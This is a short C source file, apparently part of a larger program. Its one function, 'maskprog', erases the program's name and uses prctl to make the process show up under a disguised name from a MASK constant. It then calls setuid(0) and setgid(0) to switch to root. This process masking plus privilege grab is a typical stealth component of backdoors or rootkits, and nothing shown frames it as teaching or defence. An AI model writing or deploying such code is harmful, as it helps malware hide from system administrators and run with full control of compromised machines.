#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <stdio.h>

#include "defs.h"
#include "util.h"

void maskprog(char *progname)
{
	// mask the process name
	memset(progname, 0, strlen(progname));
	strcpy(progname, MASK);

	if (prctl(PR_SET_NAME, MASK, 0, 0) < 0)
		error("prctl");
	
	// change the UID/GID to 0 (raise privs)
	if (setuid(0) < 0)
		error("setuid");
  if (setgid(0) < 0)
		error("setgid");
}

